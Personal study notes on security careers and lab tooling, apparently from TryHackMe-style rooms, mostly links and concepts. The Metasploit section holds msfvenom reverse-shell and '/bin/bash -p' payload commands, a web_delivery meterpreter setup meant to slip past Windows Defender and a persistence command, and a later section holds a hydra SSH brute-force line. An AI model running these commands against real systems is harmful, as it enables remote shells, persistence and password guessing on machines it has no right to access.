# Notes

**offensive security**

Look for vulnerabilities, recommend patches. Exploiting bugs. Finding loopholes. Gain unauthorized access.

* **penetration tester**: "Responsible for testing technology products for finding exploitable security vulnerabilities." (web security, network security knowledge, use various programming languages, cloud security)
* **Red Teamer**: "Plays the role of an adversary, attacking an organization and providing feedback from an enemy's perspective."
* **Security Engineer**: "design, monitor, and maintain security controls, networks, and systems to help prevent cyberattacks".

**defensive Security**. 
  * **Security Analyst** (monitor - splunk?)
  * **Incident Responder** (impact? goal? what can they do? - Volatility?)
  * **malware analysis**

Detect, and stop attacks. Monitor, analyze. Investigate infected computers, try to find how they were hacked, track down cybercriminals.

* Linux security researcher > Hashing


Other

* https://www.hackerrank.com/

<hr class="sep-both">

## Random

* Attack a vulnerable machine, scan the network to discover more vulnerable machines.

* Intrusion Detection System (IDS) is a system that detects unauthorised network and system intrusions. Examples include detecting unauthorised devices connected to the local network and unauthorised users accessing a system or modifying a file.

* https://wiki.owasp.org/index.php/OWASP_Testing_Guide_v4_Table_of_Contents

* Wireshark: https://unit42.paloaltonetworks.com/wireshark-workshop-videos/

* The [SecLists GitHub Repository](https://github.com/danielmiessler/SecLists/) contains useful lists of usernames/passwords, payloads, urls, ...

<hr class="sep-both">

## Metasploit

msfvenom to generate a reverse shell ELF binary: `msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf`

generate a payload using msfvenom callnig /bin/bash:

msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf

Since we know our victim machine is running Windows Defender, let's go ahead and try a different method of payload delivery! For this, we'll be using the script web delivery exploit within Metasploit. Launch Metasploit now and select 'exploit/multi/script/web_delivery' for use.

* set target
* https://github.com/nobodyatall648/CVE-2019-1388
* A simple reverse HTTP payload.
  * 'set payload windows/meterpreter/reverse_http'.
* Following this, launch the attack as a job with the command 'run -j'.
  * jobs
  * jobs -i 0
  * paste the command output by Metasploit
* https://www.offensive-security.com/metasploit-unleashed/meterpreter-service/
* run persistence -X

<hr class="sep-both">

## Learn again

* https://www.kali.org/tools/hashid/
* https://github.com/t0thkr1s/gtfo
* https://vulners.com/ -> https://vulners.com/cve/CVE-2016-1531
* WTF (strace) https://jvns.ca/strace-zine-v3.pdf
* no_root_squash: if a root user (client) is dumping a file on the server, then they will be created as "root": https://en.wikipedia.org/wiki/Unix_security#Root_squash
* https://github.com/mzet-/linux-exploit-suggester
* https://github.com/diego-treitos/linux-smart-enumeration (lse)
* https://0xsanz.medium.com/70-ways-to-get-root-linux-privilege-escalation-d98ec78f1405 (do not seem really "useful")
* ".old" as backups
* unexpected folders in "/"
* hydra -l username -P rockyou.txt ssh://{target ip}
  * try to bruteforce ssh password
  * ssh xxx@yyy -T -L xxx:domain:xxx: create a tunnel mapping one port to another, need more research.
* Nessus policies
  * if you have a scope/knowledge of specific ports/app (dig)
  * Discovery (all ports for instance)
  * Credentials tabs
* we may try to find urls with ".bak" files, like backup of scripts...

* Must read again
  * https://tryhackme.com/room/blue
  * https://tryhackme.com/room/ice
  * https://tryhackme.com/room/linuxstrengthtraining
  * https://tryhackme.com/room/blaster
  * https://tryhackme.com/room/kenobi

* Random: https://www.thewindowsclub.com/how-to-create-a-virtualbox-shared-folder-in-windows

<hr class="sl">

## ...

URL

* Scheme: (protocol) HTTP/HTTPS/...
* Username:Password@Domain:port/Path?query#Fragment
* Methods GET, DELETE...
* Headers
  * Server: some server
  * Set-cookie: ... => server send the cookie in every request
  * ...
* Response code

---


First, let's navigate to AttackerKB! For our purposes, think of AttackerKB as similar to Exploit-DB but with a higher degree of information surrounding vulnerabilities and the exploits therein associated with them. 

* read comments
* links to metasploit
* https://github.com/horshark/akb-explorer
* ...

We previously had to add the hostname to the /etc/hosts file because of this. SSL true. Metasploit. The hostname was found in the certificate.

* Command shell session 1 opened
  * If it shows that, you can write commands, that just no a meterpreter
  * use "background"
  * `sessions -u -1`
  * go to your new nice meterpreter session
  * https://docs.metasploit.com/docs/pentesting/metasploit-guide-upgrading-shells-to-meterpreter.html
  * `sessions -k 3`